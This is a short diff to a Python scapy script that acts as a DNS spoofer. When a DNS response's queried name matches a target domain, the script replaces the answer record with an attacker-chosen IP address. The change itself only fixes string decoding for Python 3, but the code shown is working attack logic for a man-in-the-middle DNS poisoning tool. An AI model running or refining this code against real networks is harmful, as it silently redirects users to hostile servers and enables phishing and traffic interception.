@@ -24,8 +24,8 @@ def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
-        if target_DN in qname:
-            print("[+] Spoofer for: " + qname)
+        if target_DN in qname.decode():
+            print("[+] Spoofer for: " + str(qname))
             answer = DNSRR(rrname=qname, rdata=new_target_ip)
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
